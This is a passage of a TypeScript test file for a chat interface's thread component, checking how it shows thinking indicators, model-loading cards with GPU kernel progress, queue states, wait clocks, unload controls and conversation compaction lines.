  it('a finished thinking block reads Thought; a message sent live rises in, history does not', () => {
    const running = streamingSample('Borrowing lets you');
    const container = mount(threadOf({ ...running, entries: running.entries.slice(0, 2) }));
    expect(container.textContent).toContain('Thinking');
    expect(container.querySelector('[data-enter][data-role="user"]')).toBeNull();
    rerender(
      threadOf({
        ...running,
        entries: [...running.entries, end(), user('And moving?')],
        turn: null,
        lastEnd: { outcome: 'completed' },
      }),
    );
    expect(container.textContent).toContain('Thought');
    const users = [...container.querySelectorAll('article[data-role="user"]')];
    expect(users.map((node) => node.hasAttribute('data-enter'))).toEqual([false, true]);
  });

  it('a pending row stands in until the turn has work, also before the prompt entry arrives', () => {
    const base = outcomeSample('end_turn');
    const container = mount(threadOf({ ...base, turn: { turnId: 't2', phase: 'running', startedAt: 0, wait: null } }));
    expect(container.textContent).toContain('Thinking…');
    expect(container.textContent).toContain('Roses are red');
    const line = (): HTMLElement | null =>
      container.querySelector<HTMLElement>('article[aria-busy="true"][data-wait-line]');
    expect(line()?.getAttribute('data-wait-line')).toBe('think');
    expect(line()?.getAttribute('aria-label')).toBe('Assistant');
    expect(waitText(line())).toBe('Thinking…');
    const orb = line()?.querySelectorAll('canvas[data-wait-orb]');
    expect(orb).toHaveLength(1);
    expect(orb?.[0]?.getAttribute('data-wait-orb')).toBe('think');
    expect(orb?.[0]?.getAttribute('aria-hidden')).toBe('true');
    rerender(threadOf({ ...base, turn: null }, { creating: true }));
    expect(container.textContent).toContain('Starting…');
    expect(line()?.getAttribute('data-wait-line')).toBe('hold');
    expect(line()?.querySelector('canvas[data-wait-orb="hold"]')).toBe(orb?.[0]);
    rerender(threadOf(streamingSample('Hello')));
    expect(container.textContent).not.toContain('Thinking…');
    expect(container.querySelector('[data-wait-line]')).toBeNull();
    expect(container.querySelector('[data-wait-orb]')).toBeNull();
  });

  it('after 3 s with no stream event the line holds: same orb, the waiting text', () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
    try {
      const base = outcomeSample('end_turn');
      const container = mount(
        threadOf({ ...base, turn: { turnId: 't2', phase: 'running', startedAt: 0, wait: null } }),
      );
      const orb = container.querySelector('[data-wait-line="think"] canvas[data-wait-orb="think"]');
      expect(orb).not.toBeNull();
      act(() => {
        vi.advanceTimersByTime(3_000);
      });
      const line = container.querySelector('article[aria-busy="true"][data-wait-line="hold"]');
      expect(waitText(line)).toBe(CHAT.pendingWaiting);
      expect(line?.querySelector('canvas[data-wait-orb="hold"]')).toBe(orb);
    } finally {
      vi.useRealTimers();
    }
  });
});

describe('ChatThread: a message that waits for its model', () => {
  const LONG = 'qwen3.6-35b-a3b-agentworld-instruct-ud-q4-k-xl-mlx-dwq-8bits';
  const waiting = (startedAt: number): ThreadSample => ({
    mode: 'chat',
    entries: [user('Hello', 1_000)],
    turns: [],
    turn: { turnId: 't', phase: 'starting', startedAt, wait: 'model' },
    lastEnd: null,
  });
  const NOW = 1_794_411_000_000;
  const cardOf = (container: HTMLElement): HTMLElement => container.querySelector<HTMLElement>('[data-load-card]')!;
  const orbsOf = (container: HTMLElement): string[] =>
    [...container.querySelectorAll('[data-wait-orb]')].map((node) =>
      node.closest('[data-load-card]') === null ? 'outside' : (node.getAttribute('data-wait-orb') ?? ''),
    );

  it('the load card names the whole model, its size and the time since the load started; no bar, no percent', () => {
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setInterval', 'clearInterval'] });
    try {
      const container = mount(
        threadOf(waiting(NOW - 9_000), {
          model: LONG,
          host: {
            inference: 'loading',
            loading: [{ modelId: LONG, startedAt: NOW - 134_000, phase: 'weights', stepsDone: 0, steps: 0 }],
            resident: [],
            answers: [],
          },
          modelSize: (id) => (id === LONG ? 64.6 * 1024 ** 3 : null),
        }),
      );
      const card = cardOf(container);
      expect(card.getAttribute('data-variant')).toBe('loading');
      expect(card.textContent).toContain(CHAT.load.title);
      expect(card.textContent).toContain(CHAT.load.wait);
      expect(card.textContent).toContain(CHAT.load.stopNote);
      expect(card.textContent).toContain(fill(CHAT.load.size, { size: '64.6 GB' }));
      expect(card.textContent).toContain('2:14');
      expect(card.textContent).toContain(LONG);
      const name = card.querySelector(`[title="${LONG}"]`);
      expect([...name!.querySelectorAll('[aria-hidden="true"]')].map((n) => n.textContent).join('')).toBe(LONG);
      expect(container.querySelector('[role="progressbar"]')).toBeNull();
      expect(card.textContent).not.toContain('%');
      act(() => {
        vi.advanceTimersByTime(2_000);
      });
      expect(cardOf(container).textContent).toContain('2:16');
    } finally {
      vi.useRealTimers();
    }
  });

  it('three variants: this model loads, another loads first, or the engine is busy', () => {
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setInterval', 'clearInterval'] });
    try {
      const host = (loading: { modelId: string; startedAt: number } | null) => ({
        inference: loading === null ? ('ready' as const) : ('loading' as const),
        loading: loading === null ? [] : [{ ...loading, phase: 'weights' as const, stepsDone: 0, steps: 0 }],
        resident: [],
        answers: [],
      });
      const container = mount(threadOf(waiting(NOW - 61_000), { model: 'qwen-a', host: host(null) }));
      expect(cardOf(container).getAttribute('data-variant')).toBe('busy');
      expect(orbsOf(container)).toEqual(['hold']);
      expect(container.textContent).toContain(CHAT.load.titleQueued);
      expect(container.textContent).toContain(CHAT.load.busyFirst);
      expect(container.textContent).toContain('1:01');
      expect(container.textContent).not.toContain(CHAT.load.size.slice(-7));
      rerender(threadOf(waiting(NOW - 61_000), { model: 'qwen-a', host: host({ modelId: 'qwen-b', startedAt: NOW }) }));
      expect(cardOf(container).getAttribute('data-variant')).toBe('other-first');
      expect(orbsOf(container)).toEqual(['hold']);
      expect(container.textContent).toContain(fill(CHAT.load.otherFirst, { other: 'qwen-b' }));
      expect(container.textContent).toContain('1:01');
      rerender(
        threadOf(waiting(NOW - 61_000), { model: 'qwen-a', host: host({ modelId: 'qwen-a', startedAt: NOW - 5_000 }) }),
      );
      expect(cardOf(container).getAttribute('data-variant')).toBe('loading');
      expect(orbsOf(container)).toEqual(['load']);
      expect(cardOf(container).querySelector('[data-wait-orb]')?.getAttribute('aria-hidden')).toBe('true');
      expect(container.textContent).toContain('0:05');
    } finally {
      vi.useRealTimers();
    }
  });

  it('while the engine prepares GPU kernels the card says so, counts the steps and fills a bar', () => {
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setInterval', 'clearInterval'] });
    try {
      const container = mount(
        threadOf(waiting(NOW - 9_000), {
          model: 'qwen-a',
          host: {
            inference: 'loading',
            loading: [{ modelId: 'qwen-a', startedAt: NOW - 40_000, phase: 'kernels', stepsDone: 12, steps: 45 }],
            resident: [],
            answers: [],
          },
        }),
      );
      const card = cardOf(container);
      expect(card.getAttribute('data-phase')).toBe('kernels');
      expect(card.textContent).toContain(CHAT.load.titleKernels);
      expect(card.textContent).not.toContain(CHAT.load.title);
      expect(card.textContent).toContain('12 of 45');
      expect(card.textContent).toContain(CHAT.load.kernelNote);
      expect(card.textContent).toContain(CHAT.load.stopNote);
      const bar = byRole(container, 'meter', CHAT.load.titleKernels);
      expect(bar?.getAttribute('aria-valuenow')).toBe('27');
      expect(bar?.getAttribute('aria-valuetext')).toBe('27%, 12 of 45');
    } finally {
      vi.useRealTimers();
    }
  });

  it('the weight read, or a load with no steps, keeps the plain card', () => {
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setInterval', 'clearInterval'] });
    try {
      const hostOf = (phase: 'weights' | 'kernels', stepsDone: number | null, steps: number | null) => ({
        inference: 'loading' as const,
        loading: [{ modelId: 'qwen-a', startedAt: NOW - 1_000, phase, stepsDone, steps }],
        resident: [],
        answers: [],
      });
      const container = mount(threadOf(waiting(NOW - 1_000), { model: 'qwen-a', host: hostOf('weights', 0, 0) }));
      for (const host of [hostOf('weights', 0, 0), hostOf('kernels', null, null), hostOf('kernels', 0, 0)]) {
        rerender(threadOf(waiting(NOW - 1_000), { model: 'qwen-a', host }));
        const card = cardOf(container);
        expect(card.textContent).toContain(CHAT.load.title);
        expect(card.textContent).toContain(CHAT.load.wait);
        expect(card.textContent).not.toContain(CHAT.load.titleKernels);
        expect(card.textContent).not.toContain(' of ');
        expect(container.querySelector('[role="meter"]')).toBeNull();
      }
    } finally {
      vi.useRealTimers();
    }
  });

  it('two loads at once: each conversation shows its own model and count', () => {
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setInterval', 'clearInterval'] });
    try {
      const host = {
        inference: 'loading' as const,
        loading: [
          { modelId: 'qwen-a', startedAt: NOW - 60_000, phase: 'kernels' as const, stepsDone: 30, steps: 50 },
          { modelId: 'qwen-b', startedAt: NOW - 5_000, phase: 'kernels' as const, stepsDone: 3, steps: 45 },
        ],
        resident: [],
        answers: [],
      };
      const container = mount(threadOf(waiting(NOW - 1_000), { model: 'qwen-a', host }));
      expect(cardOf(container).textContent).toContain('30 of 50');
      expect(cardOf(container).textContent).toContain('1:00');
      rerender(threadOf(waiting(NOW - 1_000), { model: 'qwen-b', host }));
      expect(cardOf(container).getAttribute('data-variant')).toBe('loading');
      expect(cardOf(container).textContent).toContain('3 of 45');
      expect(cardOf(container).textContent).toContain('0:05');
      expect(cardOf(container).textContent).not.toContain('30 of 50');
      rerender(threadOf(waiting(NOW - 1_000), { model: 'qwen-c', host }));
      expect(cardOf(container).getAttribute('data-variant')).toBe('other-first');
      expect(cardOf(container).textContent).toContain(fill(CHAT.load.otherFirst, { other: 'qwen-a' }));
      expect(cardOf(container).textContent).not.toContain(' of 5');
    } finally {
      vi.useRealTimers();
    }
  });

  it('a model in memory: the card waits for the engine and never says the model loads', () => {
    const onStatus = vi.fn();
    const host = {
      inference: 'ready' as const,
      loading: [],
      resident: [{ modelId: 'qwen-a', sizeBytes: null }],
      answers: [],
    };
    const container = mount(threadOf(waiting(Date.now()), { model: 'qwen-a', host, onStatus }));
    const card = cardOf(container);
    expect(card.getAttribute('data-variant')).toBe('in-memory');
    expect(orbsOf(container)).toEqual(['hold']);
    expect(card.textContent).toContain(CHAT.load.titleQueued);
    expect(card.textContent).toContain(CHAT.load.inMemory);
    expect(card.textContent).not.toContain(CHAT.load.busyFirst);
    expect(card.textContent?.toLowerCase()).not.toContain('load');
    expect(onStatus).toHaveBeenCalledWith(CHAT.load.inMemory);
    expect(onStatus).not.toHaveBeenCalledWith(fill(CHAT.load.status, { model: 'qwen-a' }));
  });

  it('a running turn with no output says it waits while the model runs its limit of answers', () => {
    const running: ThreadSample = {
      ...waiting(Date.now()),
      turn: { turnId: 't', phase: 'running', startedAt: 500, wait: null },
    };
    const host = (inFlight: number, maxConcurrent: number, queued: number, lastStart = 400) => ({
      inference: 'ready' as const,
      loading: [],
      resident: [{ modelId: 'qwen-a', sizeBytes: null }],
      answers: [{ modelId: 'qwen-a', inFlight, maxConcurrent, queued, lastStart }],
    });
    const queuedLine = fill(CHAT.pendingQueuedOne, { model: 'qwen-a' });
    const container = mount(threadOf(running, { model: 'qwen-a', host: host(1, 1, 1) }));
    expect(container.textContent).toContain(queuedLine);
    expect(container.querySelector('[data-load-card]')).toBeNull();
    rerender(threadOf(running, { model: 'qwen-a', host: host(2, 4, 0) }));
    expect(container.textContent).not.toContain(queuedLine);
    expect(container.textContent).toContain(CHAT.pendingThinking);
    rerender(threadOf(running, { model: 'qwen-a', host: host(1, 1, 1, 600) }));
    expect(container.textContent).not.toContain(queuedLine);
    expect(container.textContent).toContain(CHAT.pendingThinking);
    rerender(threadOf(running, { model: 'qwen-a', host: host(1, 1, 1) }));
    expect(container.textContent).toContain(queuedLine);
    const output: ThreadSample = { ...running, entries: [user('Hello', 1_000), answer('Hi', 2_000)] };
    rerender(threadOf(output, { model: 'qwen-a', host: host(1, 1, 1) }));
    expect(container.textContent).not.toContain(queuedLine);
    expect(container.textContent).toContain('Hi');
  });

  it('the load is announced once, and a resident model shows no card', () => {
    const onStatus = vi.fn();
    const host = { inference: 'ready' as const, loading: [], resident: [], answers: [] };
    const container = mount(threadOf(waiting(Date.now()), { model: 'qwen-a', host, onStatus }));
    rerender(threadOf(waiting(Date.now()), { model: 'qwen-a', host, onStatus }));
    expect(onStatus.mock.calls.filter(([text]) => text === fill(CHAT.load.status, { model: 'qwen-a' }))).toHaveLength(
      1,
    );
    const running = {
      ...waiting(Date.now()),
      turn: { turnId: 't', phase: 'running' as const, startedAt: 0, wait: null },
    };
    rerender(threadOf(running, { model: 'qwen-a', host }));
    expect(container.querySelector('[data-load-card]')).toBeNull();
    expect(container.textContent).toContain(CHAT.pendingThinking);
  });

  it('the engine note under an unsent stop follows the engine: still loading, then in memory, then none', () => {
    const sample: ThreadSample = {
      mode: 'chat',
      entries: [user('Hello', 1_000)],
      turns: [],
      turn: null,
      lastEnd: { turnId: 't', outcome: 'cancelled', unsent: true },
    };
    const container = mount(
      threadOf(sample, {
        model: 'qwen-a',
        host: {
          inference: 'loading',
          loading: [{ modelId: 'qwen-a', startedAt: 0, phase: 'weights', stepsDone: 0, steps: 0 }],
          resident: [],
          answers: [],
        },
      }),
    );
    expect(container.textContent).toContain(CHAT.outcomes['cancelled-unsent']);
    expect(container.textContent).toContain(fill(CHAT.engine.stillLoading, { model: 'qwen-a' }));
    expect(anchors(container)).toContain('/engine');
    const open = container.querySelector('a[href="/engine"]')!;
    expect(open.className).toBe('link');
    expect(open.closest('p')?.textContent).toContain(CHAT.engine.stillLoading.slice(0, 20));
    rerender(
      threadOf(sample, {
        model: 'qwen-a',
        host: {
          inference: 'ready',
          loading: [],
          resident: [{ modelId: 'qwen-a', sizeBytes: 2 * 1024 ** 3 }],
          answers: [],
        },
      }),
    );
    expect(container.textContent).not.toContain(fill(CHAT.engine.stillLoading, { model: 'qwen-a' }));
    expect(container.textContent).toContain(fill(CHAT.engine.resident, { model: 'qwen-a', size: '2.0 GB' }));
    expect(anchors(container)).not.toContain('/engine');
    rerender(
      threadOf(sample, { model: 'qwen-a', host: { inference: 'ready', loading: [], resident: [], answers: [] } }),
    );
    expect(container.textContent).not.toContain('is in memory');
    expect(container.textContent).toContain(CHAT.outcomes['cancelled-unsent']);
  });

  it('the in-memory note carries Unload, which follows its control: working takes no press, off is disabled', () => {
    const sample: ThreadSample = {
      mode: 'chat',
      entries: [user('Hello', 1_000)],
      turns: [],
      turn: null,
      lastEnd: { turnId: 't', outcome: 'cancelled', unsent: true },
    };
    const host = {
      inference: 'ready' as const,
      loading: [],
      resident: [{ modelId: 'qwen-a', sizeBytes: null }],
      answers: [],
    };
    const onUnload = vi.fn();
    const unloadButton = (): HTMLButtonElement | undefined =>
      [...container.querySelectorAll('button')].find((b) => b.closest('p')?.textContent?.includes('is in memory'));
    const named = (name: string): boolean => {
      const copy = unloadButton()?.cloneNode(true) as HTMLElement | undefined;
      for (const hidden of copy?.querySelectorAll('[aria-hidden="true"]') ?? []) hidden.remove();
      return copy?.textContent === name;
    };
    const container = mount(threadOf(sample, { model: 'qwen-a', host }));
    expect(container.textContent).toContain(fill(CHAT.engine.residentNoSize, { model: 'qwen-a' }));
    expect(unloadButton()).toBeUndefined();
    rerender(threadOf(sample, { model: 'qwen-a', host, unload: { state: 'idle', onUnload } }));
    expect(named(CHAT.engine.unload)).toBe(true);
    act(() => unloadButton()!.click());
    expect(onUnload).toHaveBeenCalledTimes(1);
    rerender(threadOf(sample, { model: 'qwen-a', host, unload: { state: 'working', onUnload } }));
    expect(named(CHAT.engine.unloading)).toBe(true);
    act(() => unloadButton()!.click());
    expect(onUnload).toHaveBeenCalledTimes(1);
    rerender(threadOf(sample, { model: 'qwen-a', host, unload: { state: 'off', onUnload } }));
    expect(unloadButton()?.disabled).toBe(true);
  });
});

describe('ChatThread: the wait line between the steps of a long turn', () => {
  const NOW = 1_794_411_600_000;
  const tool = (status: string, ts: number, endTs?: number, id = 'r1'): TranscriptEntry => ({
    kind: 'tool',
    ts,
    id,
    name: 'probe',
    title: 'Probe src/main.rs',
    status,
    ...(endTs === undefined ? {} : { endTs }),
  });
  const work = (entries: TranscriptEntry[]): ThreadSample => ({
    mode: 'work',
    entries: [user('Fix the build', NOW - 600_000), ...entries],
    turns: [],
    turn: { turnId: 't', phase: 'running', startedAt: NOW - 600_000, wait: null },
    lastEnd: null,
  });
  const afterRead = work([
    thinking('Look at main', NOW - 200_000, NOW - 190_000),
    tool('completed', NOW - 189_000, NOW - 65_000),
  ]);
  type Request = NonNullable<NonNullable<ChatThreadProps['host']>['requests']>[number];
  const request = (over: Partial<Request>): Request => ({
    session: 'conv-1',
    modelId: 'qwen-a',
    phase: 'decode',
    startedAt: NOW - 30_000,
    prefillDone: null,
    prefillTotal: null,
    generated: null,
    ...over,
  });
  const hostWith = (requests: Request[], queued = 0) => ({
    inference: 'ready' as const,
    loading: [],
    resident: [{ modelId: 'qwen-a', sizeBytes: null }],
    answers: [{ modelId: 'qwen-a', inFlight: requests.length, maxConcurrent: 4, queued, lastStart: NOW - 30_000 }],
    requests,
  });
  const props = (requests: Request[], queued = 0): Partial<ChatThreadProps> => ({
    conversationId: 'conv-1',
    model: 'qwen-a',
    host: hostWith(requests, queued),
  });
  const line = (container: HTMLElement): HTMLElement | null =>
    container.querySelector<HTMLElement>('article[aria-busy="true"][data-wait-line]');
  const clock = (container: HTMLElement): string | undefined =>
    line(container)?.querySelector('[data-wait-clock]')?.textContent ?? undefined;
  const timers = () =>
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setInterval', 'clearInterval', 'setTimeout', 'clearTimeout'] });

  it('after a finished tool row the turn says it is working, with the time since that step ended', () => {
    timers();
    try {
      const container = mount(threadOf(afterRead, { model: 'qwen-a' }));
      expect(container.textContent).toContain('Thought');
      expect(waitText(line(container))).toBe(CHAT.pendingWorking);
      expect(line(container)?.getAttribute('data-wait-line')).toBe('think');
      expect(clock(container)).toBe('1:05');
      act(() => {
        vi.advanceTimersByTime(3_000);
      });
      expect(waitText(line(container))).toBe(CHAT.pendingWaiting);
      expect(clock(container)).toBe('1:08');
    } finally {
      vi.useRealTimers();
    }
  });

  it('a retry row or a note is no step: neither the words nor the clock move for it', () => {
    timers();
    try {
      const retried: TranscriptEntry = {
        kind: 'notice',
        ts: NOW - 20_000,
        code: 'retry',
        cause: 'stalled',
        attempts: 1,
        max: 3,
        endTs: NOW - 10_000,
        outcome: 'recovered',
      };
      const note: TranscriptEntry = { kind: 'user', ts: NOW - 5_000, text: 'Use pnpm', promptIndex: null, note: true };
      const container = mount(threadOf(work([retried, note]), { model: 'qwen-a' }));
      expect(waitText(line(container))).toBe(CHAT.pendingThinking);
      expect(clock(container)).toBe('10:00');
      rerender(threadOf(work([...afterRead.entries.slice(1), retried, note]), { model: 'qwen-a' }));
      expect(waitText(line(container))).toBe(CHAT.pendingWorking);
      expect(clock(container)).toBe('1:05');
    } finally {
      vi.useRealTimers();
    }
  });

  it('a picture row is no step: "Thinking…" stays and the clock runs from the start', () => {
    timers();
    try {
      const left: TranscriptEntry = {
        kind: 'notice',
        ts: NOW - 20_000,
        code: 'picture',
        what: 'dropped',
        count: 1,
        notes: ['Image 1 was dropped before send: unreadable Png header.'],
      };
      const container = mount(threadOf(work([left]), { model: 'qwen-a' }));
      expect(waitText(line(container))).toBe(CHAT.pendingThinking);
      expect(clock(container)).toBe('10:00');
    } finally {
      vi.useRealTimers();
    }
  });

  it("names what the engine does with this conversation's request: queued, reading the prompt, generating", () => {
    const container = mount(threadOf(afterRead, props([request({ phase: 'queued' })])));
    expect(waitText(line(container))).toBe(CHAT.pendingQueued);
    expect(line(container)?.getAttribute('data-wait-line')).toBe('hold');
    rerender(
      threadOf(
        afterRead,
        props([
          request({ session: 'conv-2', phase: 'decode', startedAt: NOW - 400_000 }),
          request({ phase: 'prefill', prefillDone: 69_300, prefillTotal: 121_300 }),
        ]),
      ),
    );
    expect(waitText(line(container))).toBe(fill(CHAT.pendingReadingOf, { done: '69.3K', total: '121.3K' }));
    const bar = byRole(container, 'meter', CHAT.pendingReadMeter);
    expect(bar?.getAttribute('aria-valuenow')).toBe('57');
    expect(bar?.getAttribute('aria-valuetext')).toBe('57%, 69.3K of 121.3K');
    rerender(threadOf(afterRead, props([request({ phase: 'decode' })])));
    expect(waitText(line(container))).toBe(CHAT.pendingThinking);
    expect(container.querySelector('[role="meter"]')).toBeNull();
  });

  it("another conversation's request never reads as this one's: the model is busy only when ours may wait behind it", () => {
    const other = request({ session: 'conv-2', phase: 'prefill', prefillDone: 5_000, prefillTotal: 20_000 });
    const container = mount(threadOf(afterRead, props([other])));
    expect(waitText(line(container))).toBe(CHAT.pendingWorking);
    rerender(threadOf(afterRead, props([other], 1)));
    expect(waitText(line(container))).toBe(fill(CHAT.pendingBusyReading, { done: '5,000', total: '20K' }));
    expect(waitText(line(container))).not.toContain('conversation');
    rerender(threadOf(afterRead, props([request({ session: null, phase: 'decode', startedAt: NOW - 10_000 })])));
    expect(waitText(line(container))).toBe(CHAT.pendingBusy);
    rerender(threadOf(afterRead, props([request({ session: null, phase: 'decode', startedAt: NOW - 120_000 })])));
    expect(waitText(line(container))).toBe(CHAT.pendingWorking);
  });

  it('a model load or a stop keeps its own row between steps', () => {
    const loading = {
      ...hostWith([]),
      inference: 'loading' as const,
      loading: [{ modelId: 'qwen-a', startedAt: NOW - 5_000, phase: 'weights' as const, stepsDone: 0, steps: 0 }],
    };
    const container = mount(threadOf(afterRead, { conversationId: 'conv-1', model: 'qwen-a', host: loading }));
    expect(container.querySelector('[data-load-card]')).not.toBeNull();
    expect(line(container)).toBeNull();
    rerender(
      threadOf(
        { ...afterRead, turn: { turnId: 't', phase: 'cancelling', startedAt: NOW - 600_000, wait: null } },
        props([request({ phase: 'decode' })]),
      ),
    );
    expect(waitText(line(container))).toBe(CHAT.pendingStopping);
  });

  it('hides while a tool runs, while text streams, and while a permission card is open', () => {
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setTimeout', 'clearTimeout'] });
    try {
      const container = mount(threadOf(work([tool('in_progress', NOW - 1_000)]), props([request({})])));
      expect(line(container)).toBeNull();
      rerender(threadOf(work([tool('pending', NOW - 1_000)]), props([request({})])));
      expect(line(container)).toBeNull();
      rerender(threadOf(afterRead, { ...props([request({})]), asking: true }));
      expect(line(container)).toBeNull();
      const streaming = work([tool('completed', NOW - 9_000, NOW - 8_000), answer('Now I', NOW - 500)]);
      rerender(threadOf(streaming, { ...props([request({})]), asOfMs: NOW - 500 }));
      expect(line(container)).toBeNull();
      expect(container.textContent).toContain('Now I');
      act(() => {
        vi.advanceTimersByTime(3_000);
      });
      expect(waitText(line(container))).toBe(CHAT.pendingThinking);
      rerender(threadOf(work([thinking('Hm', NOW, NOW + 100)]), { ...props([]), asOfMs: NOW + 3_100 }));
      expect(line(container)).toBeNull();
    } finally {
      vi.useRealTimers();
    }
  });

  it('a thought or text quiet for 3 s hands its live mark to the wait line: one Thinking, not two', () => {
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setTimeout', 'clearTimeout'] });
    try {
      const live = (container: HTMLElement): Element[] => [...container.querySelectorAll('[data-live]')];
      const thought = work([thinking('Now call the build', NOW - 500, NOW - 400)]);
      const container = mount(threadOf(thought, { ...props([request({})]), asOfMs: NOW - 400 }));
      expect(line(container)).toBeNull();
      expect(live(container)).toHaveLength(1);
      expect(container.textContent).toContain(CHAT.thinking);
      act(() => {
        vi.advanceTimersByTime(3_000);
      });
      expect(waitText(line(container))).toBe(CHAT.pendingThinking);
      expect(live(container)).toHaveLength(0);
      expect(container.textContent?.split(CHAT.thinking)).toHaveLength(2);
      expect(container.textContent).toContain(CHAT.thought);
      rerender(threadOf(work([answer('Now I', NOW + 2_900)]), { ...props([request({})]), asOfMs: NOW + 3_000 }));
      expect(line(container)).toBeNull();
      expect(container.querySelector('[data-role="assistant"][data-live]')).not.toBeNull();
      act(() => {
        vi.advanceTimersByTime(3_000);
      });
      expect(waitText(line(container))).toBe(CHAT.pendingThinking);
      expect(container.querySelector('[data-role="assistant"][data-live]')).toBeNull();
      expect(container.textContent).not.toContain(CHAT.writing);
    } finally {
      vi.useRealTimers();
    }
  });

  it('the clock restarts at each new wait', () => {
    timers();
    try {
      const first = work([tool('completed', NOW - 70_000, NOW - 61_000)]);
      const container = mount(threadOf(first, props([])));
      expect(clock(container)).toBe('1:01');
      act(() => {
        vi.advanceTimersByTime(2_000);
      });
      expect(clock(container)).toBe('1:03');
      const running = work([
        tool('completed', NOW - 70_000, NOW - 61_000),
        tool('in_progress', NOW + 2_000, undefined, 'r2'),
      ]);
      rerender(threadOf(running, props([])));
      expect(line(container)).toBeNull();
      act(() => {
        vi.advanceTimersByTime(10_000);
      });
      const second = work([
        tool('completed', NOW - 70_000, NOW - 61_000),
        tool('completed', NOW + 2_000, NOW + 12_000, 'r2'),
      ]);
      rerender(threadOf(second, props([])));
      expect(clock(container)).toBe('0:00');
      act(() => {
        vi.advanceTimersByTime(4_000);
      });
      expect(clock(container)).toBe('0:04');
    } finally {
      vi.useRealTimers();
    }
  });
});

describe('ChatThread: the compaction line and its marker', () => {
  const NOW = 1_794_411_600_000;
  const tool = (ts: number, endTs: number): TranscriptEntry => ({
    kind: 'tool',
    ts,
    id: 'r1',
    name: 'probe',
    title: 'Probe src/main.rs',
    status: 'completed',
    endTs,
  });
  const work = (entries: TranscriptEntry[]): ThreadSample => ({
    mode: 'work',
    entries: [user('Fix the build', NOW - 600_000), ...entries],
    turns: [],
    turn: { turnId: 't', phase: 'running', startedAt: NOW - 600_000, wait: null },
    lastEnd: null,
  });
  const afterRead = work([thinking('Look at main', NOW - 200_000, NOW - 190_000), tool(NOW - 189_000, NOW - 65_000)]);
  const compaction = { phase: 'running' as const, startedAt: NOW - 42_000, tokensBefore: 222_822 };
  type Request = NonNullable<NonNullable<ChatThreadProps['host']>['requests']>[number];
  const request = (over: Partial<Request>): Request => ({
    session: 'conv-1',
    modelId: 'qwen-a',
    phase: 'decode',
    startedAt: NOW - 40_000,
    prefillDone: null,
    prefillTotal: null,
    generated: null,
    ...over,
  });
  const props = (requests: Request[], over: Partial<ChatThreadProps> = {}): Partial<ChatThreadProps> => ({
    conversationId: 'conv-1',
    model: 'qwen-a',
    host: {
      inference: 'ready',
      loading: [],
      resident: [{ modelId: 'qwen-a', sizeBytes: null }],
      answers: [{ modelId: 'qwen-a', inFlight: 1, maxConcurrent: 4, queued: 0, lastStart: NOW - 40_000 }],
      requests,
    },
    compaction,
    ...over,
  });
  const lines = (container: HTMLElement): HTMLElement[] => [
    ...container.querySelectorAll<HTMLElement>('article[aria-busy="true"][data-wait-line]'),
  ];
  const detail = (container: HTMLElement): string | null =>
    container.querySelector('[data-compaction-line] article .text-muted')?.textContent ?? null;
  const help = (container: HTMLElement): boolean =>
    container.querySelector('[data-compaction-line] > p')?.textContent === CHAT.compactingHelp;

  it('takes the place of the wait line: one line with the fold orb and the clock since the compaction started', () => {
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setInterval', 'clearInterval', 'setTimeout', 'clearTimeout'] });
    try {
      const container = mount(threadOf(afterRead, props([])));
      expect(lines(container)).toHaveLength(1);
      const line = lines(container)[0]!;
      expect(line.getAttribute('data-wait-line')).toBe('fold');
      expect(line.querySelector('canvas')?.getAttribute('data-wait-orb')).toBe('fold');
      expect(waitText(line)).toBe(CHAT.compacting);
      expect(line.querySelector('[data-wait-clock]')?.textContent).toBe('0:42');
      expect(detail(container)).toBeNull();
      expect(help(container)).toBe(true);
      act(() => {
        vi.advanceTimersByTime(3_000);
      });
      expect(lines(container)).toHaveLength(1);
      expect(line.querySelector('[data-wait-clock]')?.textContent).toBe('0:45');
      rerender(threadOf(afterRead, props([], { compaction: null })));
      expect(lines(container)).toHaveLength(1);
      expect(lines(container)[0]!.getAttribute('data-wait-line')).not.toBe('fold');
      expect(container.querySelector('[data-compaction-line]')).toBeNull();
    } finally {
      vi.useRealTimers();
    }
  });

  it('shows while text would hide the wait line, and the tail hands it its live mark', () => {
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setTimeout', 'clearTimeout'] });
    try {
      const streaming = work([answer('Now I', NOW - 100)]);
      const container = mount(threadOf(streaming, props([], { asOfMs: NOW - 100 })));
      expect(lines(container).map((l) => l.getAttribute('data-wait-line'))).toEqual(['fold']);
      expect(container.querySelectorAll('[data-live]')).toHaveLength(0);
    } finally {
      vi.useRealTimers();
    }
  });

  it("says what the conversation's summary request does: reading with a bar, then writing with its tokens", () => {
    const reading = request({ phase: 'prefill', prefillDone: 113_200, prefillTotal: 172_200 });
    const container = mount(threadOf(afterRead, props([reading])));
    expect(detail(container)).toBe(fill(CHAT.compactingReading, { done: '113.2K', total: '172.2K' }));
    expect(byRole(container, 'meter', CHAT.pendingReadMeter)?.getAttribute('aria-valuenow')).toBe('66');
    rerender(threadOf(afterRead, props([request({ generated: 3_200 })])));
    expect(detail(container)).toBe(fill(CHAT.compactingWritingOf, { n: '3,200' }));
    expect(container.querySelector('[role="meter"]')).toBeNull();
    rerender(threadOf(afterRead, props([request({ generated: 12_400 })])));
    expect(detail(container)).toBe(fill(CHAT.compactingWritingOf, { n: '12.4K' }));
    rerender(threadOf(afterRead, props([request({})])));
    expect(detail(container)).toBe(CHAT.compactingWriting);
    rerender(threadOf(afterRead, props([request({ phase: 'queued' })])));
    expect(detail(container)).toBeNull();
    // A request from before the compaction, or another conversation's, says nothing about it.
    rerender(threadOf(afterRead, props([request({ startedAt: NOW - 50_000, generated: 900 })])));
    expect(detail(container)).toBeNull();
    rerender(threadOf(afterRead, props([request({ session: 'conv-2', generated: 900 })])));
    expect(detail(container)).toBeNull();
    expect(lines(container)).toHaveLength(1);
  });

  it('the help sentence shows only for the first compaction of a conversation', () => {
    const before: TranscriptEntry = { kind: 'compaction', ts: NOW - 300_000, outcome: 'done' };
    const sample = work([before, tool(NOW - 189_000, NOW - 65_000)]);
